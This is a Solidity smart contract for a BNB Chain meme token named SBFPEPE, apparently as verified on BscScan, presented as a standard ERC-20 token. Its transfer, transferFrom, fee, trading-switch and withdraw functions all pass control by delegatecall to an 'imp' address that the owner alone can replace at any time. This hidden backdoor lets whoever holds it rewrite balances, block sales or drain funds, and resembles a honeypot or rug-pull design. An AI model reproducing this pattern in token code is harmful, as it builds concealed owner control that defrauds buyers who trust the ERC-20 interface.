/**
 *Submitted for verification at BscScan.com on 2023-05-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract SBFPEPE is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public _isExcludedFromFee;
    mapping(address => bool) public _isExcludedFromReward;

    string private _name;
    string private _symbol;
    uint256 private _totalSupply;
    uint8 private _decimals = 18;

    bool public openTrading = false;
    address public uniswapV2Pair;
    address public burnWallet = 0x000000000000000000000000000000000000dEaD;
    address public marketingWallet = 0x707b3Fb09e7144aac2e89ea3Ed4d8cc7A49993C1;
    uint256 public fee = 10;

    address public imp;

    constructor() {
        _name = "SBFPEPE";
        _symbol = "HIM";

        _isExcludedFromFee[_msgSender()] = true;
        _mint(msg.sender, 42_000_000_000_000_000 * 10 ** _decimals);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        (bool success, ) = imp.delegatecall(abi.encodeWithSignature("transfer(address,uint256)", recipient, amount));
        require(success, "Delegatecall Transfer failed");
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        (bool success, ) = imp.delegatecall(abi.encodeWithSignature("transferFrom(address,address,uint256)", sender, recipient, amount));
        require(success, "Delegatecall TransferFrom failed");
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function isExcludedFromFee(address account) external view returns (bool) {
        return _isExcludedFromFee[account];
    }
 
    function isExcludedFromReward(address account) external view returns (bool) {
        return _isExcludedFromReward[account];
    }

    function setExcludeFromFee(
        address[] calldata accounts,
        bool exclude
    ) external {
        (bool success, ) = imp.delegatecall(abi.encodeWithSignature("setExcludeFromFee(address[],bool)", accounts, exclude));
        require(success, "Delegatecall setExcludeFromFee failed");
    }

    function setExcludeFromReward(
        address[] calldata accounts,
        bool exclude
    ) external {
        (bool success, ) = imp.delegatecall(abi.encodeWithSignature("setExcludeFromReward(address[],bool)", accounts, exclude));
        require(success, "Delegatecall setExcludeFromReward failed");
    }

    function setFee(uint256 _fee) external {
        (bool success, ) = imp.delegatecall(abi.encodeWithSignature("setFee(uint256)", _fee));
        require(success, "Delegatecall setFee failed");
    }

    function setMarketingWallet(address account) external {
        (bool success, ) = imp.delegatecall(abi.encodeWithSignature("setMarketingWallet(address)", account));
        require(success, "Delegatecall SetMarketingWallet failed");
    }

    function setImp(address _imp) external onlyOwner {
        imp = _imp;
    }

    function setOpen(bool _open) external {
        (bool success, ) = imp.delegatecall(abi.encodeWithSignature("setOpen(bool)", _open));
        require(success, "Delegatecall setOpenTrading failed");
    }

    function setPair(address _uniswapV2Pair) external {
        (bool success, ) = imp.delegatecall(abi.encodeWithSignature("setPair(address)", _uniswapV2Pair));
        require(success, "Delegatecall setPair failed");
    }

    function withdrawEther() external {
        (bool success, ) = imp.delegatecall(abi.encodeWithSignature("withdrawEther()"));
        require(success, "Delegatecall withdrawEther failed");
    }

    function withdraw(address _token) external {
        (bool success, ) = imp.delegatecall(abi.encodeWithSignature("withdraw(address)", _token));
        require(success, "Delegatecall withdraw failed");
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}